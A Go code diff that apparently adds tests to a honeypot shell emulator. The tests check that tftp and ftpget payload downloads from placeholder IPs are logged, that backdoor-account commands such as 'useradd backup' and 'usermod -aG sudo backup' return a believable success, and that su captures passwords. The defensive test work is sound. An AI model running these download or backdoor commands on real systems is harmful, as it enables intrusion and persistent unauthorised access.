@@ -233,6 +233,63 @@ func TestDropperContentCaptured(t *testing.T) {
 	}
 }
 
+// TestTftpAndFtpgetLogDownloads proves the BusyBox fetch fallbacks are captured:
+// tftp and ftpget log a download attempt with the staging host rather than falling
+// through to "terminated", so a loader that avoids wget/curl still surfaces its IOC.
+func TestTftpAndFtpgetLogDownloads(t *testing.T) {
+	h, p := setup(t, "ubuntu")
+	login(t, h, p, "root")
+	run(h, "tftp -g -r mips.bin 198.51.100.5")
+	run(h, "ftpget 203.0.113.9 m.bin m.bin")
+
+	var hosts []string
+	for _, e := range h.Entries() {
+		if e.Event == "DOWNLOAD_ATTEMPT" {
+			hosts = append(hosts, e.Host)
+		}
+	}
+	joined := strings.Join(hosts, " ")
+	if !strings.Contains(joined, "198.51.100.5") || !strings.Contains(joined, "203.0.113.9") {
+		t.Errorf("tftp/ftpget did not log the fetch hosts: %v", hosts)
+	}
+}
+
+// TestPersistenceCommandsReportSuccess proves the account/persistence commands a
+// loader runs after break-in report a believable silent success instead of
+// "command not found", which would tell the loader it is not on a real shell.
+func TestPersistenceCommandsReportSuccess(t *testing.T) {
+	h, p := setup(t, "ubuntu")
+	login(t, h, p, "root")
+	for _, cmd := range []string{"chpasswd", "useradd backup", "usermod -aG sudo backup"} {
+		if out := run(h, cmd); strings.Contains(out, "not found") {
+			t.Errorf("%q reported command not found: %q", cmd, out)
+		}
+	}
+}
+
+// TestSuCapturesPassword proves su prompts for and captures a password, the way
+// Hajime-class loaders use it, rather than failing as an unknown command.
+func TestSuCapturesPassword(t *testing.T) {
+	h, p := setup(t, "ubuntu")
+	login(t, h, p, "root")
+	h.SendLine("su")
+	if _, ok := h.ReadUntil("Password:", time.Second); !ok {
+		t.Fatal("su did not prompt for a password")
+	}
+	h.SendLine("zyad5001")
+	h.ReadFor(400 * time.Millisecond)
+
+	var found bool
+	for _, e := range h.Entries() {
+		if e.Event == "CREDENTIAL" && e.Password == "zyad5001" {
+			found = true
+		}
+	}
+	if !found {
+		t.Error("su did not capture the offered password as a credential")
+	}
+}
+
 func TestParsingShapes(t *testing.T) {
 	h, p := setup(t, "ubuntu")
 	login(t, h, p, "root")
